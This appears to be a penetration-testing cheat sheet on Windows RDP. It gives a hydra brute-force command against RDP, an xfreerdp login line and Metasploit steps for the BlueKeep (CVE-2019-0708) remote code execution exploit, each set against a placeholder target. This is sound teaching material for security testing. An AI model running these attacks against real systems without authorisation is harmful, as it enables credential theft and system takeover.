# RDP

# Explanation

- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and is used to remotely authenticate and interact with a Windows system.

- RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.

- RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

- We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.

# Brute force attack

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target> -s <target-port>
```
# RDP client

```
xfreerdp /u:<user> /p:<pass> /v:<target>:<port>

Do you trust the above certificate? (Y)
```

# Exploiting Windows CVE-2019-0708 RDP vulnerability (BlueKeep)

## Description

- BlueLeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.

- The BlueKeep vulnerability was made public by Microsoft in May 2019.

- The BlueKeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.

- The BlueKeep vulnerability affects multiple versions of Windows : 
    - XP
    - Vista
    - Windows 7
    - Windows Server 2008 & 2008 R2

## RCE with Metasploit Framework

```
msfconsole
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS <target>
msf6 > run
```